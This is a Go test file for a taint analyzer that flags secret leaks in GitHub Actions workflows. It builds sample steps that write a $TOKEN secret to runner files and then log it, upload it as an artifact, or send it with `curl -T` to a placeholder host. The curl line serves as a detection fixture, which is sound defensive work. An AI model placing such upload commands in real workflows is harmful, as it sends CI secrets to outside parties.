package taint

import (
	"fmt"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestShellLiteralRunnerFilesRetainSecretTaint(t *testing.T) {
	for _, file := range []string{"$GITHUB_PATH", "$GITHUB_ENV", "$GITHUB_OUTPUT", "$GITHUB_STEP_SUMMARY"} {
		for _, directory := range []string{"", "subdir"} {
			for _, sink := range []Kind{Log, Network, Artifact} {
				t.Run(string(sink)+"/"+file+"/"+directory, func(t *testing.T) {
					producer := fmt.Sprintf("      - id: producer\n        working-directory: %q\n        run: |\n          printf 'VALUE=%%s\\n' \"$TOKEN\" > '%s'\n", directory, file)
					consumer := ""
					switch sink {
					case Log:
						producer += fmt.Sprintf("          cat '%s'\n", file)
					case Network:
						producer += fmt.Sprintf("          curl -T '%s' https://example.test\n", file)
					case Artifact:
						path := file
						if directory != "" {
							path = directory + "/" + path
						}
						consumer = "      - uses: actions/upload-artifact@v4\n        with:\n          path: '" + path + "'\n"
					}
					result, err := Analyze(outputWorkflow(t, producer, consumer, ""), SecretLeakRule())
					require.NoError(t, err)
					require.Empty(t, result.Gaps)
					require.Len(t, result.Findings, 1, "%+v", result.Findings)
					assert.Equal(t, sink, result.Findings[0].Site.Kind)
				})
			}
		}
	}
}

func TestShellLiteralRunnerFilesRespectWorkingDirectory(t *testing.T) {
	for _, file := range []string{"$GITHUB_PATH", "$GITHUB_ENV", "$GITHUB_OUTPUT"} {
		for _, tt := range []struct {
			directory, read string
			finding         bool
		}{
			{"first", "cat '" + file + "'", true},
			{"second", "cat '" + file + "'", false},
			{"second", "cat '../first/" + file + "'", true},
			{"", "cat '" + file + "'", false},
		} {
			t.Run(file+"/"+tt.directory+"/"+tt.read, func(t *testing.T) {
				producer := fmt.Sprintf("      - id: producer\n        working-directory: first\n        run: printf 'VALUE=%%s\\n' \"$TOKEN\" > '%s'\n", file)
				consumer := fmt.Sprintf("      - working-directory: %q\n        run: %s\n", tt.directory, tt.read)
				result, err := Analyze(outputWorkflow(t, producer, consumer, ""), SecretLeakRule())
				require.NoError(t, err)
				require.Empty(t, result.Gaps)
				assert.Equal(t, tt.finding, len(result.Findings) > 0, "%+v", result.Findings)
			})
		}
	}
}

func TestShellLiteralRunnerFilesDoNotPublishValues(t *testing.T) {
	for _, tt := range []struct {
		producer, consumer string
	}{
		{`printf 'VALUE=%s\n' "$TOKEN" > '$GITHUB_OUTPUT'`, `echo '${{ steps.producer.outputs.VALUE }}'`},
		{`printf 'VALUE=%s\n' "$TOKEN" > '$GITHUB_ENV'`, `echo "$VALUE"`},
		{`printf 'VALUE=%s\n' "$TOKEN" > '$GITHUB_ENV'`, `echo '${{ env.VALUE }}'`},
	} {
		t.Run(tt.producer+"/"+tt.consumer, func(t *testing.T) {
			producer := "      - id: producer\n        run: " + tt.producer + "\n"
			consumer := "      - run: " + tt.consumer + "\n"
			result, err := Analyze(outputWorkflow(t, producer, consumer, ""), SecretLeakRule())
			require.NoError(t, err)
			require.Empty(t, result.Gaps)
			assert.Empty(t, result.Findings)
		})
	}

}

func TestShellRunnerFileGlobIdentity(t *testing.T) {
	for _, tt := range []struct {
		name, target string
		finding      bool
	}{
		{"literal filename", "'$GITHUB_PATH'", true},
		{"expanded runner file", `"$GITHUB_PATH"`, false},
	} {
		t.Run(tt.name, func(t *testing.T) {
			result := checkSecretScript(t, `printf '%s\n' "$TOKEN" > `+tt.target+`; cat *`)
			require.Empty(t, result.Gaps)
			assert.Equal(t, tt.finding, len(result.Findings) > 0, "%+v", result.Findings)
		})
	}
}

func TestShellRunnerCommandFilesAreStepLocal(t *testing.T) {
	for _, file := range []string{"GITHUB_OUTPUT", "GITHUB_ENV", "GITHUB_PATH"} {
		t.Run(file, func(t *testing.T) {
			producer := fmt.Sprintf("      - id: producer\n        run: printf 'VALUE=%%s\\n' \"$TOKEN\" >> \"$%s\"\n", file)
			consumer := fmt.Sprintf("      - run: cat \"$%s\"\n", file)
			result, err := Analyze(outputWorkflow(t, producer, consumer, ""), SecretLeakRule())
			require.NoError(t, err)
			require.Empty(t, result.Gaps)
			assert.Empty(t, result.Findings)
		})
	}
}
